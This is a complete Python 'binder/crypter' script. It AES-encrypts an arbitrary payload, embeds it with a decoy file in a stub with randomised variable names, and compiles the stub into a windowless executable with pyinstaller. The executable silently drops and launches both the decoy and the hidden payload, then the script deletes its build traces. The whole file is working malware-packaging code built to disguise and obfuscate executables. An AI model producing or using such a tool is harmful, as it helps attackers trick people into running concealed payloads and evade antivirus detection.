from time import sleep
import pyaes
import binascii
from os import system
import sys
import random
import string

# Open file
try:
    file_name = sys.argv[1]
    archive_type = sys.argv[2]
    no_file = sys.argv[3]
    no_type = sys.argv[4]
except:
    print("Incorrect usage!")
    print("Usage: python Binder.py <filename> <extension [.exe, .txt, ...]> <normal file> <extension [.exe, .txt, ...]>")
    exit()
sleep(0.5)
print("Opening " + file_name)

file = open(file_name, 'rb')
sleep(0.3)
print("Reading file...")
file_data = file.read()
sleep(0.1)
print("File readed.")
file.close()

no_file_data = open(no_file, 'rb')
no_data = no_file_data.read()
no_file_data.close()
no_data_hex = binascii.hexlify(no_data)

#default
crypt_key = input("Enter encryption/decryption key [LENGH: 16]\n> ") # String key
key_len = len(crypt_key)
if(key_len < 16 or key_len > 16):
    print("The key needs to have 16 characters!")
    exit()
crypt_key = crypt_key.encode() # 16 bytes

# File crypting
print("Encrypting...")
en_aes = pyaes.AESModeOfOperationCTR(crypt_key)
new_data = en_aes.encrypt(file_data)
new_data_hex = binascii.hexlify(new_data)

#archive = open("HEX_"+file_name+".txt", "wb")
#archive.write(new_data_hex)
#archive.close()

def var_gen(var_lengh):
    letters_up = string.ascii_uppercase
    letters_down = string.ascii_lowercase
    return ''.join(random.choice(letters_up + letters_down) for i in range(int(var_lengh)))

# Variables

var_pyaes = var_gen(16)
var_random = var_gen(10)
var_string = var_gen(10)
var_binascii = var_gen(10)
var_key_gen = var_gen(9)
var_LUP = var_gen(7)
var_LDOWN = var_gen(7)
var_key = var_gen(9)
var_crypt_data_hex = var_gen(5) + "_hex"
var_crypt_data = var_gen(6)
var_en_aes = var_gen(8)
var_decrypt_Data = var_gen(7)
var_new_file_name = var_gen(9)
var_new_file = var_gen(4)
var_no_file = var_gen(4)
var_no_name = no_file
var_no_data_unhex = var_gen(5)
var_subprocess = var_gen(6)
var_proc = var_gen(4)

# Create stub
stub_txt = "import pyaes as "+var_pyaes+", random as "+var_random+", string as "+var_string+", binascii as "+var_binascii + "\n\n"
stub_txt +="def "+var_key_gen+"(lengh=16):" + "\n"
stub_txt +="    "+var_LUP+" = "+var_string+".ascii_uppercase" + "\n"
stub_txt +="    "+var_LDOWN+" = "+var_string+".ascii_lowercase" + "\n"
stub_txt +="    return ''.join("+var_random+".choice("+var_LUP+" + "+var_LDOWN+") for i in range(int(lengh)))" + "\n\n"
stub_txt +=var_key+" = \""+ crypt_key.decode() + "\"" + "\n"
stub_txt +=var_key+" = "+var_key+".encode()" + "\n"
stub_txt +=var_crypt_data_hex+" = \"" + new_data_hex.decode() + "\"" + "\n"
stub_txt +=var_crypt_data+" = "+var_binascii+".unhexlify("+var_crypt_data_hex+")" + "\n"
stub_txt +=var_en_aes+" = "+var_pyaes+".AESModeOfOperationCTR("+var_key+")" + "\n"
stub_txt +=var_decrypt_Data+" = "+var_en_aes+".decrypt("+var_crypt_data+")" + "\n"
stub_txt +=var_new_file_name+" = "+var_key_gen+"() + \"" + archive_type + "\"" + "\n"
stub_txt +=var_no_data_unhex+" = "+var_binascii+".unhexlify(\""+no_data_hex.decode()+"\")" + "\n"
stub_txt +=var_no_file+" = open(\""+var_no_name+"\", \'wb\')" + "\n"
stub_txt +=var_no_file+".write("+var_no_data_unhex+")" + "\n"
stub_txt +=var_no_file+".close()" + "\n"
stub_txt +=var_new_file+" = open("+var_new_file_name+", \'wb\')" + "\n"
stub_txt +=var_new_file+".write("+var_decrypt_Data+")" + "\n"
stub_txt +=var_new_file+".close()" + "\n"
stub_txt +="import subprocess as "+var_subprocess + "\n"
stub_txt +=var_proc+" = "+var_subprocess+".Popen(\""+var_no_name+"\", shell=True, stdin="+var_subprocess+".PIPE, stdout="+var_subprocess+".PIPE, stderr="+var_subprocess+".PIPE)" + "\n"
stub_txt +=var_proc+" = "+var_subprocess+".Popen("+var_new_file_name+", shell=True, stdin="+var_subprocess+".PIPE, stdout="+var_subprocess+".PIPE, stderr="+var_subprocess+".PIPE)" + "\n"


stub_name = "Stub.py"
archive = open(stub_name, "w")
archive.write(stub_txt)
archive.close()

# Convert to exe
print("Compiling into exe...")
sleep(0.5)
system("pyinstaller -F -w --clean " + stub_name)
print("Compiled.")

# Delete useless files
system("cls")
print("Moving files...")
system("move /Y dist\Stub.exe Finished_stub.exe > NUL")
sleep(0.01)
system("del /Q/S __pycache__ > NUL")
sleep(0.01)
system("rmdir __pycache__ > NUL")
sleep(0.01)
system("del build /Q/S > NUL")
sleep(0.01)
system("rmdir /Q build\Stub")
sleep(0.01)
system("rmdir /Q build")
sleep(0.01)
system("del /Q/S dist > NUL")
sleep(0.01)
system("rmdir /Q dist")
sleep(0.01)
system("del /Q Stub.spec")
sleep(0.01)
system("del /Q Stub.py")
sleep(0.01)
print("Stub created.")

a=input("\nFile sucefully encrypted. Press Enter to exit.\n")
exit()